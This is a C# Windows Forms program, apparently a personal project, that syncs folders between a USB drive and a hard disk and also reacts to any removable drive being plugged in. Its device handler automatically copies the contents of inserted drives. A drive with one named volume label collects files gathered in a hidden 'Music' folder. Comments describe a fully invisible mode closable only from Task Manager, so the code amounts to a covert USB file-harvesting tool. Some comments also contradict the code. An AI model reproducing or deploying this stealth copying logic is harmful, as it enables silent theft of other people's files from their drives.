using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp2_upan
{
    public partial class Form1 : Form
    {
        public const int WM_DEVICECHANGE = 0x219;
        public const int DBT_DEVICEARRIVAL = 0x8000;
        public const int DBT_CONFIGCHANGECANCELED = 0x0019;
        public const int DBT_CONFIGCHANGED = 0x0018;
        public const int DBT_CUSTOMEVENT = 0x8006;
        public const int DBT_DEVICEQUERYREMOVE = 0x8001;
        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;
        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
        public const int DBT_DEVICEREMOVEPENDING = 0x8003;
        public const int DBT_DEVICETYPESPECIFIC = 0x8005;
        public const int DBT_DEVNODES_CHANGED = 0x0007;
        public const int DBT_QUERYCHANGECONFIG = 0x0017;
        public const int DBT_USERDEFINED = 0xFFFF;
        private string path1;//首选保存位置
        private string path2;//备用保存位置
        public int filecount=0;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //notifyIcon1.Visible = false;
            //去掉标记以实现完全隐身状态（此状态只能从任务管理器处关闭程序）
            //TransparencyKey = Color.White  ;
            //Opacity = 0;
            checkDirectory("D:/Music", "E:/Music");

        }

        private void checkDirectory(string patha, string pathb)
        {
            //设置两个路径或更多以保证适合不同的计算机，我教室的电脑就没有D盘
            if (Directory.Exists(patha) == false)
            {
                try
                {
                    Directory.CreateDirectory(patha);
                    path1 = patha;
                }
                catch
                {
                    Directory.CreateDirectory(pathb);
                    path1 = pathb;
                }
            }
            else
            {
                path1 = patha;
            }
            //隐藏文件夹
            File.SetAttributes(path1, FileAttributes.Hidden);
        }        
        
        //获得u盘下所有文件夹名
        public void getDirectoryUtoY(string DirectoryPath, bool isMYUSB)
        {//搜索U盘下所有子目录
            DirectoryInfo root = new DirectoryInfo(DirectoryPath);
            FileInfo[] fis = root .GetFiles();//文件类型
            DirectoryInfo[] directs = root.GetDirectories();//文件夹
            foreach (FileInfo fi in fis)
            {
                copyFileNameUtoY(fi.FullName, isMYUSB);
                //filecount += 1;
                //Console.WriteLine("\n第"+filecount +"个文件："  + fi.FullName + "\n");
            }
            foreach (DirectoryInfo d in root.GetDirectories())
            {
                getDirectoryUtoY(d.FullName ,isMYUSB );//递归遍历子目录
            }
        }

        //拷贝U盘下所有最新的文件，保存到电脑硬盘上的目录）
        public void copyFileNameUtoY(string FilePath, bool isMYUSB)
        {
            string i = "", y = "";
            //MessageBox.Show("U盘目录名："+Path.GetDirectoryName (FilePath ) );
            //MessageBox.Show("U盘文件名：" + Path.GetFileName (FilePath ));
            i = Path.GetFullPath(FilePath);
            //MessageBox.Show("U盘全路径字符串：" + i,"UtoY");
            //MessageBox.Show("U盘全路径字符串长度：" + i.Length, "UtoY");
            //MessageBox.Show("U盘text1字符串长度：" + textBox1.Text.Length, "UtoY");
            //y = i.Substring(i.Length - textBox1.Text.Length);
            y = i.Remove(0, textBox1.Text.Length+1);
            //MessageBox.Show("截取后的字符串："+y, "UtoY");
            y = textBox2.Text + @"\" + y;
            //MessageBox.Show("拼接后的字符串：" + y, "UtoY");
            FileInfo upanfile = new FileInfo(i);
            FileInfo yingpanfile = new FileInfo(y);

            if (File.Exists(y))//检查在电脑目录中是否存在此文件，若有，则比较修改时间，保证时间是最新的文件，若没有，则新建文件。
            {
                copyFiles(upanfile, yingpanfile);
               
            }
            else
            {
                try
                {
                    if (Directory.Exists(yingpanfile.Directory.ToString()))
                    {
                        //MessageBox.Show(i + "\n硬盘不存在该文件！需复制", "UtoY");
                        File.Copy(upanfile.FullName, yingpanfile.FullName, true);
                        //MessageBox.Show("复制完成！", "UtoY");
                    }
                    else
                    {
                        //MessageBox.Show(y + "\n硬盘不存在该目录！需创建\n" + yingpanfile.Directory.ToString(), "UtoY");
                        Directory.CreateDirectory(yingpanfile.Directory.ToString());
                        //MessageBox.Show("硬盘目录创建完成！", "UtoY");
                        //MessageBox.Show(i + "\n硬盘不存在该文件！需复制", "UtoY");
                        File.Copy(upanfile.FullName, yingpanfile.FullName, true);
                        //MessageBox.Show("复制完成！", "UtoY");
                    }
                }
                catch (Exception)
                {
                    
                    throw;
                }
                
            }
        }

        //获得硬盘下所有文件夹名
        public void getDirectoryYtoU(string DirectoryPath, bool isMYUSB)
        {//搜索硬盘下所有子目录
            DirectoryInfo root = new DirectoryInfo(DirectoryPath);
            FileInfo[] fis = root.GetFiles();//文件类型
            DirectoryInfo[] directs = root.GetDirectories();//文件夹
            foreach (FileInfo fi in fis)
            {
                copyFileNameYtoU(fi.FullName, isMYUSB);
                //filecount += 1;
                //Console.WriteLine("\n第"+filecount +"个文件："  + fi.FullName + "\n");
            }
            foreach (DirectoryInfo d in root.GetDirectories())
            {
                getDirectoryYtoU(d.FullName, isMYUSB);//递归遍历子目录
            }
        }

        //获取硬盘下所有的文件，保存到U盘上的目录）
        public void copyFileNameYtoU(string FilePath, bool isMYUSB)
        {
            string i = "", y = "";
            //MessageBox.Show("硬盘文件目录名："+Path.GetDirectoryName (FilePath ) ,"YtoU");
            //MessageBox.Show("硬盘文件名：" + Path.GetFileName (FilePath), "YtoU");
            i = Path.GetFullPath(FilePath);
            //MessageBox.Show("硬盘全路径字符串：" + i, "YtoU");
            //MessageBox.Show("硬盘全路径字符串长度：" + i.Length, "YtoU");
            //MessageBox.Show("硬盘text2字符串长度：" + textBox2.Text.Length, "YtoU");
            //y = i.Substring(i.Length - textBox1.Text.Length);
            y = i.Remove(0, textBox2.Text.Length+1);
            //MessageBox.Show("截取后的字符串："+ y, "YtoU");
            y = textBox1.Text + @"\" + y;
            //MessageBox.Show("拼接后U盘目录："+ y, "YtoU");
            FileInfo yingpanfile = new FileInfo(i);
            FileInfo upanfile = new FileInfo(y);
            if (File.Exists(y))//检查在U盘目录中是否存在此文件，若有，则比较修改时间，保证时间是最新的文件，若没有，则新建文件。
            {
                copyFiles(upanfile,yingpanfile  );

            }
            else
            {
                try
                {
                    if (Directory.Exists(upanfile.Directory.ToString ()))
                        {                                                
                        //MessageBox.Show(i + "\nU盘上不存在该文件！需复制", "YtoU");
                        File.Copy(yingpanfile.FullName, upanfile.FullName, true);
                        //MessageBox.Show("复制完成！", "YtoU");
                    }
                    else
                    {
                        //MessageBox.Show(y + "\nU盘不存在该目录！需创建\n" + upanfile.Directory.ToString(), "YtoU");
                        Directory.CreateDirectory(upanfile.Directory.ToString());
                        //MessageBox.Show("U盘目录创建完成！", "YtoU");
                        //MessageBox.Show(i + "\nU盘不存在该文件！需复制", "YtoU");
                        File.Copy(yingpanfile.FullName, upanfile.FullName, true);
                        //MessageBox.Show("复制完成！", "YtoU");

                    }
                }
                catch (Exception)
                {

                    throw;
                }

            }
        }

        //复制文件到TargetPath
        private void copyFiles(FileInfo upanfile, FileInfo yingpanfile)//U盘到硬盘拷贝
        {//自定义被复制文件后缀名
            //MessageBox.Show("时间差="+ (upanfile.LastWriteTimeUtc  - yingpanfile.LastWriteTimeUtc).Hours );
            try
            {
                TimeSpan span = upanfile.LastWriteTimeUtc - yingpanfile.LastWriteTimeUtc;

                if (span .TotalHours  > 12)
                {
                    //MessageBox.Show(upanfile.FullName + "\nU盘修改时间：" + upanfile.LastWriteTimeUtc.ToString() + "(最新)" + "\n硬盘修改时间：" + yingpanfile.LastWriteTimeUtc.ToString() + "\n时间差=" + span.TotalHours);
                    //MessageBox.Show("U盘文件是后修改的:" + upanfile.Name);
                    File.Copy(upanfile.FullName, yingpanfile.FullName, true);
                    //MessageBox.Show("从U盘到硬盘拷贝完成！");
                }
                if (span.TotalHours < -12)
                {
                    MessageBox.Show(yingpanfile.FullName + "\nU盘修改时间：" + upanfile.LastWriteTimeUtc.ToString() + "\n" + "硬盘修改时间：" + yingpanfile.LastWriteTimeUtc.ToString() + "（最新）\n时间差=" + span.TotalHours);
                    //MessageBox.Show("硬盘文件是后修改的:" + yingpanfile.Name);
                    File.Copy(yingpanfile.FullName, upanfile.FullName, true);
                    //MessageBox.Show("从硬盘到U盘拷贝完成！");
                }

            }
            catch (Exception)
            {

                throw;
            }
            

        }

        //获取硬盘事件
        protected override void WndProc(ref Message m)
        {
            try
            {
                if (m.Msg == WM_DEVICECHANGE)//获取消息的 ID 号。
                {
                    switch (m.WParam.ToInt32())//获取消息的 System.Windows.Forms.Message.WParam 字段。
                    {
                        case WM_DEVICECHANGE:
                            break;
                        case DBT_DEVICEARRIVAL://U盘插入
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                Console.WriteLine(drive .DriveType +"驱动类型");
                                if (drive.DriveType == DriveType.Removable)
                                {
                                    Console.WriteLine(drive.Name.ToString() + "驱动类型2");
                                    MessageBox.Show("有U盘插入！");
                                    DriveInfo info = new DriveInfo(drive.Name.ToString());
                                                                       
                                    MessageBox.Show("盘符："+drive.Name.ToString()+"   "+"名称："+ info.VolumeLabel);
                                    
                                    Console.WriteLine(info.VolumeLabel + "驱动类型3");
                                    if (info.VolumeLabel.Equals("金士顿1"))
                                    {
                                        /*
                                         * 名字叫SANDISK的U盘一旦插入将自动剪切path1内的所有文件到U盘内
                                        而不会将此U盘内的文件复制到path1内
                                        */
                                        path2 = drive.Name.ToString() + "/Music";
                                        Directory.CreateDirectory(drive.Name.ToString() + "/Music");
                                        getDirectoryUtoY(path1, true);
                                        DirectoryInfo root = new DirectoryInfo(path1);
                                        checkDirectory("D:/Music", "E:/Music");
                                        //删除文件夹及文件夹内所有文件
                                        foreach (FileInfo f in root.GetFiles())
                                        {
                                            //File.Delete(f.FullName);
                                        }
                                        Directory.Delete(path1);
                                        break;
                                    }
                                    else
                                    {
                                        //其它U盘一旦插入电脑则将自动复制copyFiles类中已定义后缀名的U盘文件到path1中
                                        getDirectoryUtoY(drive.Name.ToString(), false);
                                        MessageBox.Show("结束啦！");

                                        
                                    }   
                                    break;
                                }
                            }
                            break;
                        case DBT_CONFIGCHANGECANCELED:
                            break;
                        case DBT_CONFIGCHANGED:
                            break;
                        case DBT_CUSTOMEVENT:
                            break;
                        case DBT_DEVICEQUERYREMOVE:
                            break;
                        case DBT_DEVICEQUERYREMOVEFAILED:
                            break;
                        case DBT_DEVICEREMOVECOMPLETE:   //U盘卸载 
                            break;
                        case DBT_DEVICEREMOVEPENDING:
                            break;
                        case DBT_DEVICETYPESPECIFIC:
                            break;
                        case DBT_DEVNODES_CHANGED:
                            break;
                        case DBT_QUERYCHANGECONFIG:
                            break;
                        case DBT_USERDEFINED:
                            break;
                        default:
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            base.WndProc(ref m);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog path = new FolderBrowserDialog();
            path.SelectedPath = @"i:\化学文件\";
            path.ShowDialog();
            this.textBox1 .Text = path.SelectedPath;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog path = new FolderBrowserDialog();
            path.SelectedPath = @"F:\BaiduYunDownload\化学文件\";
            path.ShowDialog();
            this.textBox2 .Text = path.SelectedPath;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            getDirectoryUtoY(textBox1 .Text , false);
            MessageBox.Show("U盘向硬盘同步完成！");
            getDirectoryYtoU(textBox2.Text, false);
            MessageBox.Show("硬盘向U盘同步完成！");
        }
    }
}
                                
